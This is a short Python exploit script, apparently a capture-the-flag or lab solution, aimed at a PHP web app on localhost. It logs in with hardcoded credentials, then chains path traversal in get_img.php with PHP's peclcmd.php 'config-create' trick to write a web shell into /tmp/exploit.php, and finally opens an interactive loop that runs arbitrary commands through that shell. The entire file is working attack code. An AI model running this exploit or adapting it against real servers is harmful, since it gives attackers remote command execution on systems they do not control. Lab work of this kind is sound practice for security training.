import requests
import os

url = "http://localhost:2222/login.php"
r = requests.get(url)
cookie = r.cookies.get_dict()
cookie_value = cookie['PHPSESSID']
curl_cmd = "curl -b 'PHPSESSID=" + cookie_value + "' 'http://localhost:2222/get_img.php/?+config-create+/&file=.././.././.././.././.././.././.././.././usr/local/lib/./php/peclcmd.php&<?=`$_GET[1]`?>+/tmp/exploit.php'"

data = {"username": "test", "password": "test", "asscess_key": "messi_is_goat", "submit": ''}
r = requests.post(url, cookies=cookie, data=data)

os.system(curl_cmd)

while True:
    command = input("Command: ")
    url_exploit = "http://localhost:2222/get_img.php?file=.././.././.././.././.././tmp/exploit.php&1={}".format(command)
    r = requests.get(url_exploit ,cookies=cookie)
    print(r.text.split("php&")[1].split("/pear/php")[0])